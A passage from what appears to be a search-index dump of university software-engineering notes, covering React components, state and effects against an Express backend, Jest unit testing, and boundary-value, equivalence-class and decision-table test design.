we should follow and exted the same structure. Suppose we would like to build a frontend app to interact with the express.js app by submitting new messages and displaying the list of submitted messages. By breaking down the UI components we might have the following By following the UI structural breakdown, we modify the Echo.js as follows, function NewMessageBar({message, onSubmitClick}) { return ( <div> <input type=\"text\" placeholder=\"\" value={message}></input> <button onClick={onSubmitClick}> Submit </button> </div> ); } function MessageList({messages}) { let rows = []; for (let i in messages) { rows.push( <tr><td>{messages[i].time}</td><td>{messages[i].msg}</td></tr> ); } return ( <table> <tbody> <tr><th>Date Time</th><th>Message</th></tr> {rows} </tbody> </table> ); } function Echo() { const messages = [ {'time' : (new Date()).toDateString(), 'msg': 'hello'}, {'time' : (new Date()).toDateString(), 'msg': 'bye'} ]; return ( <div> <NewMessageBar message=\"\" onSubmitClick={() => {}}/> <MessageList messages={messages}/> </div> ); } export default Echo; In the above version of Echo.js , we define two sub components, namely NewMessageBar and MessageList . Note that both functions take some object as the arguments, these objects arguments are referred as props in React's terminlogies. NewMessageBar() takes an object with two attributes, message and onSubmitClick . message stores the text value in the text field and onSubmitclick is a callback when the Submit button is clicked. The function returns a text input field and a button Submit as HTML code. MessageList() takes an object with an attribute, messages which is a list of message objects. It returns a HTML table whose rows are constructed by mapping each message in the list to a row of the table. Echo() , we hard code the data (which is supposed to be returned by the AJAX call to the backend), and pass them to MessageList component during the component construction. Note that we might re-write the component definition using class instead of function. class NewMessageBar extends React.Component { constructor(props) { this.message = props.message; this.onSubmitClick = props.onSubmitClick; } render () { return ( <div> <input type=\"text\" placeholder=\"\" value={this.message}></input> <button onClick={this.onSubmitClick}> Submit </button> </div> ); } }","title":"Top Down design process (static)"},{"location":"notes/l6_2_react/#props","text":"As shown in the earlier example, props are the objects arguments being passed to the constructor of a React Component, props carried data and information passed down from the use-site, (or the outer component).","title":"Props"},{"location":"notes/l6_2_react/#make-it-interactive-dynamic","text":"Now we need to make the echo app functional. First let's make the button click to respond to the text entered in the input text field. We modify NewMessageBar as follows, function NewMessageBar({message, onMessageChange, onSubmitClick}) { return ( <div> <input type=\"text\" placeholder=\"\" value={message} onChange={(e) => {onMessageChange(e.target.value)}}> </input> <button onClick={onSubmitClick}> Submit </button> </div> ) } We introduce a new props attribtue onMessageChange which is used as the handler for the text field onChange event. Without this, the text field is read-only. Next we modify the Echo function as follows, function Echo() { const [msgTxt, setMsgTxt] = useState(\"\"); function handleSubmitClick() { alert(\"clicked \" + msgTxt); } const messages = [ {'time' : (new Date()).toDateString(), 'msg': 'hello'}, {'time' : (new Date()).toDateString(), 'msg': 'bye'} ]; return ( <div> <NewMessageBar message={msgTxt} onMessageChange={setMsgTxt} onSubmitClick={handleSubmitClick}/> <MessageList messages={messages}/> </div> ); }","title":"Make it interactive (dynamic)"},{"location":"notes/l6_2_react/#state","text":"The useState builtin function initializes a state . In Reach terminology, a state is a pair of items, an object for reading the state and a callback to signal the change of the state. In this case we have a string object (since we initilaize an empty string), and a callback function which should be called when the string is updated. In addition, we define a function handleSubmitClick which is used as the event handler of the Submit button click. Now we can interact with the app by entering the text in the message text field and pressing the button to trigger a pop up.","title":"State"},{"location":"notes/l6_2_react/#interfacing-with-the-backend-app","text":"Lastly we need to remove the hard-coded data and make use the data returned by the backend API end-point. We encounter an error of the api Call. By checking the console in the browser, we find that it is related to the Cross Origin Resource Sharing (CORS) restriction, which prevents the JS from React app to pull data from an exernal app. To lift the restriction, we modify the router code at the backend app, i.e. my_mysql_app . For all the AJAX call end-points to be accessed by our react app, (which is running on port 5000), we add the following statement before the res.send() is called. res.set('Access-Control-Allow-Origin', 'http://localhost:5000'); Coming back to our React App, we adjust the Echo function as follows, function Echo() { const [msgTxt, setMsgTxt] = useState(\"\"); function handleSubmitClick() { submitNewMessage(); } const [messages, setMessages] = useState([]); async function submitNewMessage() { const response = await fetch(`http://localhost:3000/echo/submit`, { method: 'POST', body: `msg=${msgTxt}`, headers: { 'Content-type': 'application/x-www-form-urlencoded' } }); const text = await response.text(); const json = JSON.parse(text); setMessages(json); } return ( <div> <NewMessageBar message={msgTxt} onMessageChange={setMsgTxt} onSubmitClick={handleSubmitClick}/> <MessageList messages={messages}/> </div> ); } The changes we made include remove the hard coded messages. introduce a new state [messages, setMessages] . define a function submitNewMessage() which make the HTTP POST api request to the backend app and update the message. update the body of handleSubmitClick() to incorporate submitNewMessage() . When the button is clicked, a sequence of operations were carried out in the following order. 1. handleSubmitClick() invokes submitNewMessage() 1. submitNewMessage() make the api call 1. when the api call returns the result, the body text is extracted and parsed as JSON. 1. setMessages() update the messages state, which triggers the re-rendering of the Echo() component. Lastly, let's make the app to displays all the existing messages when it is firstly loaded. Naively, we might added the following function definitions and function call statements before the return statement in the Echo() function. async function submitNewMessage() { ... } // existing async function initMessages() { // newly added const response = await fetch(`http://localhost:3000/echo/all`); const text = await response.text(); const json = JSON.parse(text); setMessages(json); } initMessages(); // newly added, causing loop return ( ... ); // existing With this fix, our App seems to work on the first launch but subsequently it gets into an infinite loop. This is because initMessages() is now part of the render routine of the Echo component, when the Echo is rendered, the messages list is updated, which causes the component to re-render.","title":"Interfacing with the backend app"},{"location":"notes/l6_2_react/#life-cycle-of-react-components","text":"In order to fix this issue, we need to understand the life cycle of React Component. image credits https://levelup.gitconnected.com/componentdidmakesense-react-lifecycle-explanation-393dcb19e459 When a React Component is spawned, sever methods are called at the sever end (i.e. when our react app is hosted). After which, it calls componentDidMount , then goes into a kind of loop based on states or propos changes, it will re-renders. The loop goes on until it unmount, (i.e. the component is destroyed). To access each of the stages of the React Component, let's rewrite the Echo component in class style class Echo extends Component { constructor(props) { super(props); this.state = { msgTxt : \"\", messages: []}; } componentDidMount() { } componentDidUpdate() { } async submitNewMessage() { const response = await fetch(`http://localhost:3000/echo/submit`, { method: 'POST', body: `msg=${this.state.msgTxt}`, headers: { 'Content-type': 'application/x-www-form-urlencoded' } }); const text = await response.text(); const json = JSON.parse(text); this.setMessages(json); } setMsgTxt(s) { this.setState({ msgTxt: s, messages : this.state.messages }); } setMessages(l) { this.setState({ msgTxt: this.state.msgTxt, messages : l}); } handleSubmitClick() { this.submitNewMessage(); } render() { return ( <div> <NewMessageBar message={this.state.msgTxt} onMessageChange={(s) => this.setMsgTxt(s)} onSubmitClick={() => this.handleSubmitClick()}/> <MessageList messages={this.state.messages}/> </div> ); } } In the above version, we refactor the parts using the useState() using the inherited attribute of the Component class, state and setState() . In the above example, we put msgTxt and messages in this.state and implement setMsgTxt and setMessages using this.setState . In addition, we lift all the nested functions up by turning them into methods. Since functions are different from method internally, we need to turn the props arguments into lambdas, e.g. onMessageChange={(s) => this.setMsgTxt(s)} instead of onMessageChange={setMsgTxt} . Finally we override the componentDidMount and componentDidUpdate methods.","title":"Life Cycle of React Components"},{"location":"notes/l6_2_react/#exercise-non-graded","text":"Add some log messages to the constructor , componentDidUpdate , componentDidMount and render . Run the program to observe the order of the log messages being printed. Can you identify which message is printed from which part of the life cycle? As suggested by the life cycle, it is better to initilize the state outside the loop, i.e. componentDidMount . Hence we change the componentDidMount as follows, and introduce a new function to retrieve all existing messages from the API and update the state. async initMessages() { const response = await fetch(`http://localhost:3000/echo/all`); const text = await response.text(); const json = JSON.parse(text); this.setMessages(json); } componentDidMount() { this.initMessages(); } With this change, the App behaves as what we want.","title":"Exercise (Non Graded)"},{"location":"notes/l6_2_react/#effect","text":"Some of us might argue, rewriting the component in the class form allows us to access the different stage of the life-cycle. The code could be too verbose. To do archieve the same result in the function form component, we need to use the effect hook. Recall the earlier version in function form. function Echo() { const [msgTxt, setMsgTxt] = useState(\"\"); function handleSubmitClick() { submitNewMessage(); } const [messages, setMessages] = useState([]); async function submitNewMessage() { const response = await fetch(`http://localhost:3000/echo/submit`, { method: 'POST', body: `msg=${msgTxt}`, headers: { 'Content-type': 'application/x-www-form-urlencoded' } }); const text = await response.text(); const json = JSON.parse(text); setMessages(json); } useEffect( () => { // useEffect console.log(\"from effect\"); }); return ( <div> <NewMessageBar message={msgTxt} onMessageChange={setMsgTxt} onSubmitClick={handleSubmitClick}/> <MessageList messages={messages}/> </div> ); } The statement calling useEffect defines a call-back to be called every time the component re-renders. We can restrict the call-back to be triggered only when certain states have updated, e.g. useEffect( () => { console.log(\"from effect\"); }, [msgTxt]); will be triggered whenever msgTxt state changes. If the 2nd argument is an empty list [] . the call-back will only be triggered when the component is mounted. Hence to achieve what we want, i.e. to get all the existing messages and assign them to the state messages , we neeed to include the following in the body of the Echo function. async function initMessages() { const response = await fetch(`http://localhost:3000/echo/all`); const text = await response.text(); const json = JSON.parse(text); setMessages(json); } useEffect( () => { initMessages(); }, []); We could think of useEffect with only 1 argument is behaving like componentDidUpdate . useEffect with a 2nd argument as a non empty list is behaving like componentDidUpdate with conditional update (depeneding on whether the given state has changed). When useEffect is used with a 2nd argument as an empty list it is behaving like componentDidMount .","title":"Effect"},{"location":"notes/l6_2_react/#exercise-graded","text":"Complete the tasks in ce8_q1. Refer to ce8. Complete the tasks in ce8_q2. Refer to ce8.","title":"Exercise (Graded)"},{"location":"notes/l6_2_react/#further-reading","text":"Thinking in React https://react.dev/learn/thinking-in-react React JS and Express JS https://www.freecodecamp.org/news/create-a-react-frontend-a-node-express-backend-and-connect-them-together-c5798926047c/ React JS life cycle https://levelup.gitconnected.com/componentdidmakesense-react-lifecycle-explanation-393dcb19e459 Multi page React https://www.geeksforgeeks.org/how-to-create-a-multi-page-website-using-react-js/ Multi page with state https://www.microverse.org/blog/how-to-get-set-up-with-react-redux-in-your-next-multi-page-project React JS and Express JS with Login and Token authentication https://www.digitalocean.com/community/tutorials/how-to-add-login-authentication-to-react-applications","title":"Further Reading"},{"location":"notes/l8_1_softwaretesting/","text":"50.003 - Software Testing Learning Outcomes By the end of this unit, you should be able to Explain what is software testing Articulate the purpose of software testing List the components of a test List the components of a test case Develop simple testsuite for JavaScript programs using Jest Software testing Software testing is one of the methods to check and validate the produced software is behaving according to the specification. Furthermore software testing helps to identify potential flaws in architectural design software security software performance The following is a quote adopted from IBM https://www.ibm.com/topics/software-testing . \"Software testing is the process of evaluating and verifying that a software product or application does what it is supposed to do. The benefits of testing include preventing bugs, reducing development costs and improving performance.\" Why software testing The answer this question. One way is to find out what if we do not conduct software testing? In particular for large scale mission critical systems, the absence of testing often leads to epic failures and excessive monetary cost. For instance in 1998, NASA launched a Mars Climate Orbiter. However due to an English Unit to Metric translation errors, the Orbiter lost contact after it passed behind Mars. Anantomy of software testing What is a test? A test in a software system is an act to exercise software with test cases. A test have two goals 1. to find faults. 1. to show that the software behaves according to expectation (specification), i.e. to build confidence. graph Input-->Program Program-->TO TO[\"Test Oracle\"]-->Pass TO[\"Test Oracle\"]-->Fail A test is a process of feeding the generated input to the test subject, i.e. the program, the output will be verified by a test oracle, which returns either Pass or Fail as result. The test oracle is often implemented as another program. What is a test case? A test case is a formal documentation of a test. A test case consists of an identifier (often linked to the user case identifier). a description of the purpose and the use case description being tested. a precondition a set of inputs the expected output the expected postcondition the execution history (the log) Limitation of Software testing Despite the importance of testing, testing alone is insufficient to ensure software free from bugs, since a failed test implies the existence of a software bug, a passed test implies that the software behaves according to the specification when given a particular instance of the input. But what about other input instances? What if the domain of the input is infinite. \"Testing shows the presence, not the absence of bugs\" -- Edsger Dijkstra Testing a Node.js app There are many tools for testing Node.js app. Jest is the one of the most popular option. To add Jest to a Node.js project, we can run npm i jest in the project description file package.json change the follow line \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\" to \"test\": \"jest\" Consider in the src/mymath.js // function sum(x,y) { return x + y; } module.exports = {sum} In the test/mymath.test.js const mymath = require('../src/mymath.js'); describe(\"mymath sum test-suite\", () => { test (\"summing of two positive numbers\", () => { const result = mymath.sum(1,2); expect(result).toBe(3); }); test (\"summing of two negative numbers\", () => { const result = mymath.sum(-3,-2); expect(result).toBe(-5); }); }) The describe() function defines a set of tests should be logically grouped together as a test suite. In the above case, in the test suite consists of two tests. Each test is define by a call to test() function, which expect a description fo the test, the action test function. In the test function, we compute the actual result by calling the test subject, sum() , and compares it with the execpted result. To execute the test, we run npm run test which runs the above test suite against the test subject and generates the following report in the console. > my_test_app@1.0.0 test > jest PASS test/mymath.test.js mymath sum tests \u2713 summing of two positive numbers (12 ms) \u2713 summing of two negative numbers (3 ms) Test Suites: 1 passed, 1 total Tests: 2 passed, 2 total Snapshots: 0 total Time: 0.35 s, estimated 1 s Ran all test suites. Testing OOP We can use Jest to test an object instance of a class, consider the following file src/FibSeq.js // src/FibSeq.js class FibSeq { constructor() { this.prev = 0; this.curr = 1; } next() { let res = this.prev + this.curr; this.prev = this.curr; this.curr = res; return res; } } module.exports = FibSeq; We can test it with the following test suite const FibSeq = require('../src/FibSeq.js'); describe(\"FibSeq class test\", () => { const fibSeq = new FibSeq(); test (\"first fib num is 1\", () => { const result = fibSeq.next(); expect(result).toBe(1); }); test (\"second fib num is 2\", () => { const result = fibSeq.next(); expect(result).toBe(2); }); }) Which will run the two tests in sequence. If we want to have the object being reset for each test case. describe(\"FibSeq class test with setup and tear down\", () =>{ let fibSeq = null; beforeEach(() => { fibSeq = new FibSeq(); }); test (\"first fib num is 1 after reset\", () => { const result = fibSeq.next(); expect(result).toBe(1); }); test (\"second fib num is 1 after reset\", () => { const result = fibSeq.next(); expect(result).toBe(1); }); afterEach(() => { fibSeq = null; }) }) Further Readings https://www.lambdatest.com/jest","title":"50.003 - Software Testing"},{"location":"notes/l8_1_softwaretesting/#50003-software-testing","text":"","title":"50.003 - Software Testing"},{"location":"notes/l8_1_softwaretesting/#learning-outcomes","text":"By the end of this unit, you should be able to Explain what is software testing Articulate the purpose of software testing List the components of a test List the components of a test case Develop simple testsuite for JavaScript programs using Jest","title":"Learning Outcomes"},{"location":"notes/l8_1_softwaretesting/#software-testing","text":"Software testing is one of the methods to check and validate the produced software is behaving according to the specification. Furthermore software testing helps to identify potential flaws in architectural design software security software performance The following is a quote adopted from IBM https://www.ibm.com/topics/software-testing . \"Software testing is the process of evaluating and verifying that a software product or application does what it is supposed to do. The benefits of testing include preventing bugs, reducing development costs and improving performance.\"","title":"Software testing"},{"location":"notes/l8_1_softwaretesting/#why-software-testing","text":"The answer this question. One way is to find out what if we do not conduct software testing? In particular for large scale mission critical systems, the absence of testing often leads to epic failures and excessive monetary cost. For instance in 1998, NASA launched a Mars Climate Orbiter. However due to an English Unit to Metric translation errors, the Orbiter lost contact after it passed behind Mars.","title":"Why software testing"},{"location":"notes/l8_1_softwaretesting/#anantomy-of-software-testing","text":"","title":"Anantomy of software testing"},{"location":"notes/l8_1_softwaretesting/#what-is-a-test","text":"A test in a software system is an act to exercise software with test cases. A test have two goals 1. to find faults. 1. to show that the software behaves according to expectation (specification), i.e. to build confidence. graph Input-->Program Program-->TO TO[\"Test Oracle\"]-->Pass TO[\"Test Oracle\"]-->Fail A test is a process of feeding the generated input to the test subject, i.e. the program, the output will be verified by a test oracle, which returns either Pass or Fail as result. The test oracle is often implemented as another program.","title":"What is a test?"},{"location":"notes/l8_1_softwaretesting/#what-is-a-test-case","text":"A test case is a formal documentation of a test. A test case consists of an identifier (often linked to the user case identifier). a description of the purpose and the use case description being tested. a precondition a set of inputs the expected output the expected postcondition the execution history (the log)","title":"What is a test case?"},{"location":"notes/l8_1_softwaretesting/#limitation-of-software-testing","text":"Despite the importance of testing, testing alone is insufficient to ensure software free from bugs, since a failed test implies the existence of a software bug, a passed test implies that the software behaves according to the specification when given a particular instance of the input. But what about other input instances? What if the domain of the input is infinite. \"Testing shows the presence, not the absence of bugs\" -- Edsger Dijkstra","title":"Limitation of Software testing"},{"location":"notes/l8_1_softwaretesting/#testing-a-nodejs-app","text":"There are many tools for testing Node.js app. Jest is the one of the most popular option. To add Jest to a Node.js project, we can run npm i jest in the project description file package.json change the follow line \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\" to \"test\": \"jest\" Consider in the src/mymath.js // function sum(x,y) { return x + y; } module.exports = {sum} In the test/mymath.test.js const mymath = require('../src/mymath.js'); describe(\"mymath sum test-suite\", () => { test (\"summing of two positive numbers\", () => { const result = mymath.sum(1,2); expect(result).toBe(3); }); test (\"summing of two negative numbers\", () => { const result = mymath.sum(-3,-2); expect(result).toBe(-5); }); }) The describe() function defines a set of tests should be logically grouped together as a test suite. In the above case, in the test suite consists of two tests. Each test is define by a call to test() function, which expect a description fo the test, the action test function. In the test function, we compute the actual result by calling the test subject, sum() , and compares it with the execpted result. To execute the test, we run npm run test which runs the above test suite against the test subject and generates the following report in the console. > my_test_app@1.0.0 test > jest PASS test/mymath.test.js mymath sum tests \u2713 summing of two positive numbers (12 ms) \u2713 summing of two negative numbers (3 ms) Test Suites: 1 passed, 1 total Tests: 2 passed, 2 total Snapshots: 0 total Time: 0.35 s, estimated 1 s Ran all test suites.","title":"Testing a Node.js app"},{"location":"notes/l8_1_softwaretesting/#testing-oop","text":"We can use Jest to test an object instance of a class, consider the following file src/FibSeq.js // src/FibSeq.js class FibSeq { constructor() { this.prev = 0; this.curr = 1; } next() { let res = this.prev + this.curr; this.prev = this.curr; this.curr = res; return res; } } module.exports = FibSeq; We can test it with the following test suite const FibSeq = require('../src/FibSeq.js'); describe(\"FibSeq class test\", () => { const fibSeq = new FibSeq(); test (\"first fib num is 1\", () => { const result = fibSeq.next(); expect(result).toBe(1); }); test (\"second fib num is 2\", () => { const result = fibSeq.next(); expect(result).toBe(2); }); }) Which will run the two tests in sequence. If we want to have the object being reset for each test case. describe(\"FibSeq class test with setup and tear down\", () =>{ let fibSeq = null; beforeEach(() => { fibSeq = new FibSeq(); }); test (\"first fib num is 1 after reset\", () => { const result = fibSeq.next(); expect(result).toBe(1); }); test (\"second fib num is 1 after reset\", () => { const result = fibSeq.next(); expect(result).toBe(1); }); afterEach(() => { fibSeq = null; }) })","title":"Testing OOP"},{"location":"notes/l8_1_softwaretesting/#further-readings","text":"https://www.lambdatest.com/jest","title":"Further Readings"},{"location":"notes/l9_1_blackbox_unittest/","text":"50.003 - Specification-based Unit Testing Learning Outcomes By the end of this unit, you should be able to Explain the differences between Specification-based testing and code-based testing Identify different levels of testing based on the design abstraction level Develop specification-based unit testing using boundary value testing Develop specification-based unit testing using equivalence class testing Develop specification-based unit testing using decision table testing Types of testing Depending on how the test cases being identified and defined, we find two types of testings Specification-based Testing In specification-based testing, the test subject is treated as a function that maps values from its domain (input) into values in its co-domain (output). The mapping can be defined as a mathemethical relation according to the specification. Specification-based testing is also known as black box testing, as the test cases are defined without the knowledge of the internal implementation of the test subject. One main advantage of specification-based testing is that it focuses the test effort on the actualization of the specification, i.e. building up confidence. In some literature, specification-based testing is also called functional testing. Code-based Testing On the other hand, one could define test cases by exploiting the knowledge of the internal structure and algorithm used in the target program. This type of testing is called code-based testing. Code-based testing is also known as white box testing. The main advantage of code-based testing is that it tries to ensure all the written codes are covered by the test, i.e. fault finding. In some literature, code-based testing is also called structural testing. Levels of testing Recall from the earlier lesson, software design often uses abstraction. Based on different levels of design abstractions, we identify the correspondent level of testings. Design abstraction level Testing level Requirement Specifications System testing Preliminary Design Integration testing Detailed Design Unit testing Unit testing - test individual smallest units of the system. Integration testing - test related units/subcomponents of the system, which are related (according to the system design) System testing - test the system as a whole, (often according to the user cases). Unit Testing Unit Testing is the test conducted against a software system in the smallest granularity. The smallest granularity is loosely defined. Depending on the choice of detailed design, implementation, programming language and framework, a unit can be either A function A class A module A UI component Specification-based Unit Testing The following are some common techniques of defining test cases of specification-based unit testing Boundary value testing Equivalence class testing Decision table testing Based on the type, the domain and the dependencies of the inputs, we shortlist the techniques which more appropriate Assumption on input Techniques Numerical value, ordinal value boundary value, equivalence class Inputs are independent boundary value, equivalence class Inputs are depenedent Decision table Boundary Value Testing In Boundary value testing, to define the test cases, we analyse the inputs to the test subject by identifying what are the input variables. what are the valid ranges. For example, consider a function f(x1,x2) takes two arguments x1 and x2 and compute some output. Based on the specification, we note that the following conditions should apply \\[ a \\leq x_1 \\leq b \\] \\[ c \\leq x_2 \\leq d \\] If we plot out a graph The grey region denotes the domain of function f . One way to generate test case based on the given domain of f is to identify the boundaries of the grey region and we pick the values from the boundary The rationale behind the boundary value testing is that errors tend to occur near the extreme values of its inputs, e.g. starting/ending indices of an array, off-by-one errors in a loop, etc. Normal Boundary Value Testing We consider the following two assumptions. assuming that our source language is strongly type and the type checker would reject values of the inputs out side of the domain. assuming when an error occurs it is solely caused by one of the inputs but not both. With these two assumptions, we can select values as input for testing as \\[ \\begin{array}{c} (x^{min}_1, x^{mean}_2) \\\\ (x^{min}_1+1, x^{mean}_2) \\\\ (x^{mean}_1, x^{mean}_2) \\\\ (x^{max}_1-1, x^{mean}_2) \\\\ (x^{max}_1, x^{mean}_2) \\\\ (x^{mean}_1, x^{min}_2) \\\\ (x^{mean}_1, x^{min}_2+1) \\\\ (x^{mean}_1, x^{max}_2-1) \\\\ (x^{mean}_1, x^{max}_2) \\end{array} \\] where $x^{min}_1 = a, x^{max}_1 = b, x^{mean}_1 = (b-a)/2 $ $x^{min}_2 = c, x^{max}_2 = d, x^{mean}_2 = (d-c)/2 $ Example Consider the following function /** * * @param {number} h - the current time in source timezone, in hour, in range of [0,23] * @param {number} stz - the source timezone, in range of [-12, +14] * timezone list https://www.ibm.com/docs/en/cloudpakw3700/2.3.0.0?topic=SS6PD2_2.3.0/doc/psapsys_restapi/time_zone_list.htm * @param {number} ttz - the target timezone, in range of [-12, +14] * @returns {[number,number]} - the current time in target timezone, in hour, in range of [0,23] and a day offset in the range of {-2,-1,0,1,2} */ function tzconvert(h, stz, ttz) { // not yet implemented } Applying Normal Boundary Value Test, We identify the following test cases id h stz ttz expected output 1 0 1 1 [0,0] 2 1 1 1 [1,0] 3 11 1 1 [11,0] 4 22 1 1 [22,0] 5 23 1 1 [23,0] 6 11 -12 1 [0,1] 7 11 -11 1 [23,0] 8 11 13 1 [23,-1] 9 11 14 1 [22,-1] 10 11 1 -12 [22,-1] 11 11 1 -11 [23,-1] 12 11 1 13 [23, 0] 13 11 1 14 [0, 1] Robust Boundary Value Testing If drop the first assumption, we should also include the out of range values in our test cases, namely besides the 9 tuples listed earlier, we include the following \\[ \\begin{array}{c} (x^{min}_1-1, x^{mean}_2) \\\\ (x^{max}_1+1, x^{mean}_2) \\\\ (x^{mean}_1, x^{min}_2-1) \\\\ (x^{mean}_1, x^{max}_2+1) \\end{array} \\] Example If we apply Robust Boundary Value Testing to the previous example i.e. tzconvert() function , we identify a few extra test cases as follows id h stz ttz expected output 14 -1 1 1 invalid 15 24 1 1 invalid 16 11 -13 1 invalid 17 11 15 1 invalid 18 11 1 -13 invalid 19 11 1 15 invalid Worst Boundary Value Testing If we drop the second assumption, we need to consider those points near the \"corners\". For Normal Worst Boundary Value test, we include \\[ \\begin{array}{c} (x^{min}_1, x^{min}_2) \\\\ (x^{min}_1, x^{min}_2+1) \\\\ (x^{min}_1+1, x^{min}_2) \\\\ (x^{min}_1+1, x^{min}_2+1) \\\\ (x^{max}_1, x^{max}_2) \\\\ (x^{max}_1-1, x^{max}_2) \\\\ (x^{max}_1, x^{max}_2-1) \\\\ (x^{max}_1-1, x^{max}_2-1) \\\\ (x^{min}_1, x^{max}_2) \\\\ (x^{min}_1, x^{max}_2-1) \\\\ (x^{min}_1+1, x^{max}_2) \\\\ (x^{min}_1+1, x^{max}_2-1) \\\\ (x^{max}_1, x^{min}_2) \\\\ (x^{max}_1-1, x^{min}_2) \\\\ (x^{max}_1, x^{min}_2+1) \\\\ (x^{max}_1-1, x^{min}_2+1) \\end{array} \\] For Robust Worst Boundary Value test, we include, \\[ \\begin{array}{c} (x^{min}_1-1, x^{min}_2-1) \\\\ (x^{min}_1-1, x^{min}_2) \\\\ (x^{min}_1-1, x^{min}_2+1) \\\\ (x^{min}_1, x^{min}_2-1) \\\\ (x^{min}_1+1, x^{min}_2-1) \\\\ (x^{max}_1+1, x^{max}_2+1) \\\\ (x^{max}_1+1, x^{max}_2) \\\\ (x^{max}_1+1, x^{max}_2-1) \\\\ (x^{max}_1, x^{max}_2+1) \\\\ (x^{max}_1-1, x^{max}_2+1) \\\\ (x^{min}_1-1, x^{max}_2+1) \\\\ (x^{min}_1, x^{max}_2+1) \\\\ (x^{min}_1+1, x^{max}_2+1) \\\\ (x^{min}_1-1, x^{max}_2) \\\\ (x^{min}_1-1, x^{max}_2-1) \\\\ (x^{max}_1+1, x^{min}_2-1) \\\\ (x^{max}_1+1, x^{min}_2) \\\\ (x^{max}_1+1, x^{min}_2+1) \\\\ (x^{max}_1, x^{min}_2-1) \\\\ (x^{max}_1-1, x^{min}_2-1) \\end{array} \\] Exercises (Non graded) Can you find out what are the extra test cases generated if we apply Robust Worst Boundary Value Testing to the tzconvert() function? Equivalence Class Testing One issue with Boundary Value Testing is that there could be too many test cases and many of them could be redundant. The intuition of the equivalence is to avoid redundancy in test cases and yet to offer a complete test. The term equivalence class refers to the math definition of equivalence relation in set theory. Given Given a domain \\(A\\) , a relation \\(R \\subseteq A \\times A\\) is a equivalence relation iff \\(R\\) is reflexive, symmetric and transitive. We can think of \\(R\\) defines a partition peer relation. For instance, we have for any \\(a \\in A\\) , \\(a R\\ a\\) , i.e. \\(a_i\\) s are in its own partition for any \\(a_1, a_2 \\in A\\) , we have \\(a_1 R\\ a_2\\) implies \\(a_2 R\\ a_1\\) , i.e. if \\(a_1\\) in the partition of \\(a_2\\) , then \\(a_2\\) is in the parition of \\(a_1\\) . for any \\(a_1, a_2, a_3 \\in A\\) , we have \\(a_1 R\\ a_2\\) and \\(a_2 R\\ a_3\\) imply \\(a_1 R\\ a_3\\) , i.e. if \\(a_1\\) and \\(a_2\\) are in the same partition, and \\(a_2\\) and \\(a_3\\) are in the same partition, then \\(a_1\\) and \\(a_3\\) are in the same partition. Equivalence class testing means to test with an element from each input partition. For example, recall the previous example, we would pick one point for each cell in \"grid\" Note that in the Strong Robust Equivalence Class Testing , we would include the dots from the top-left, top-right, bottom-left and bottom-right cells. Example For instance if we apply Equivalence Class Testing (not strong robust) to the tzconvert() function, we only need to consider test cases 3, 14, 15, 16, 17, 18, 19 . If we argue that the valid test cases are too fews, we could further partition the valid input region, into 2 or 4 sub regions. As we can observe equivalence class testing help to reduce the number of cases based on the assumption that data points in the same partition yield the same outcome. Its reliability depends on how to partitions. Decision Table Testing When there exists some dependency among the inputs, it is more applicable to use Decision Table Testing. Consider the following function /** * * @param {number} d - the day in digit, [1,31] * @param {number} m - the month in digit, [1,12] * @param {number} y - the year in digit, [0,inf) * @returns {[number,number,number]} - the next day in date [day,month,year] */ function nextdate(d,m,y) { // TODO } Applying boundary value testing and equivalence class testing might not make too much sense in this case, since the domain (partitions) are not well defined, e.g. there are too many special cases. For instance, Feb 28 days in non-leap years, 29 days in leap years; Jan, Mar, May, Jul, Aug, Oct, Dec have 31 days, while Apr, Jun, Sep and Nov have 30 days; Years that not in dd00 patterns and can be divisible by 4 are leap years, Given a Year in dd00 pattern and dd is divisible by 4 then the year is leap. Let's define M1 = {month: month has 30 days} M2 = {month: month has 31 days except December} M3 = {month: month is December} M4 = {month: month is February} D1 = {day: 1 \\(\\leq\\) day \\(\\leq\\) 27} D2 = {day: day = 28} D3 = {day: day = 29} D4 = {day: day = 30} D5 = {day: day = 31} Y1 = {year: year is a leap year} Y2 = {year: year is a common year} We list down the input constaints combination and output possibilities in a table ~ 1 2 3 4 5 6 7 8 9 10 m M1 M1 M1 M1 M1 M2 M2 M2 M2 M2 d D1 D2 D3 D4 D5 D1 D2 D3 D4 D5 y - - - - - - - - - - actions impossible X d+1 X X X X X X X d=1 X X m+1 X X m=1 y+1 ~ 11 12 13 14 15 16 17 18 19 20 21 22 m M3 M3 M3 M3 M3 M4 M4 M4 M4 M4 M4 M4 d D1 D2 D3 D4 D5 D1 D2 D2 D3 D3 D4 D5 y - - - - - - Y1 Y2 Y1 Y2 - - actions impossible X X X d+1 X X X X X X d=1 X X X m+1 X X m=1 X y+1 X Rows above actions are the combinations of input constgraints Rows below actions are the output possibilities. Based on the above table, we can generate the test cases by randomly generate a set of d , m and y that satisfy the rule id, as follow id d m y expected output rule id 1 10 4 1999 11,4,1999 1 2 28 6 2001 29,6, 2001 2 ...","title":"50.003 - Specification-based Unit Testing"},{"location":"notes/l9_1_blackbox_unittest/#50003-specification-based-unit-testing","text":"","title":"50.003 - Specification-based Unit Testing"},{"location":"notes/l9_1_blackbox_unittest/#learning-outcomes","text":"By the end of this unit, you should be able to Explain the differences between Specification-based testing and code-based testing Identify different levels of testing based on the design abstraction level Develop specification-based unit testing using boundary value testing Develop specification-based unit testing using equivalence class testing Develop specification-based unit testing using decision table testing","title":"Learning Outcomes"},{"location":"notes/l9_1_blackbox_unittest/#types-of-testing","text":"Depending on how the test cases being identified and defined, we find two types of testings","title":"Types of testing"},{"location":"notes/l9_1_blackbox_unittest/#specification-based-testing","text":"In specification-based testing, the test subject is treated as a function that maps values from its domain (input) into values in its co-domain (output). The mapping can be defined as a mathemethical relation according to the specification. Specification-based testing is also known as black box testing, as the test cases are defined without the knowledge of the internal implementation of the test subject. One main advantage of specification-based testing is that it focuses the test effort on the actualization of the specification, i.e. building up confidence. In some literature, specification-based testing is also called functional testing.","title":"Specification-based Testing"},{"location":"notes/l9_1_blackbox_unittest/#code-based-testing","text":"On the other hand, one could define test cases by exploiting the knowledge of the internal structure and algorithm used in the target program. This type of testing is called code-based testing. Code-based testing is also known as white box testing. The main advantage of code-based testing is that it tries to ensure all the written codes are covered by the test, i.e. fault finding. In some literature, code-based testing is also called structural testing.","title":"Code-based Testing"},{"location":"notes/l9_1_blackbox_unittest/#levels-of-testing","text":"Recall from the earlier lesson, software design often uses abstraction. Based on different levels of design abstractions, we identify the correspondent level of testings. Design abstraction level Testing level Requirement Specifications System testing Preliminary Design Integration testing Detailed Design 